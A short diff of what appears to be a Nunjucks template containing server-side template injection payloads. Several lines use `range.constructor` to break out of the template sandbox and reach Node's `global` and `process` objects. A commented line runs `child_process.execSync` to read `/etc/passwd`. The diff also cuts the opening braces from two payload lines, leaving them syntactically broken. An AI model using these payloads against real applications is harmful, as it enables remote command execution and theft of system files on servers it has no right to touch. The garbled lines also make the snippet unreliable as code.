@@ -9,9 +9,9 @@ HELLO??mosh
 
 values: {{ values | dump }}
 
-glob: {{ range.constructor("let gg=global; delete gg.global;return gg")() | dump}}
+range.constructor("let gg=global; delete gg.global;return gg")() | dump}}
 
-23: {{ range.constructor("return global.process")() | dump }}
+range.constructor("return global.process")() | dump }}
 24: {{ range.constructor("return templateStr.sub")() | dump }}
 
 // range.constructor("return global.process.mainModule.require('child_process').execSync('tail /etc/passwd')")()
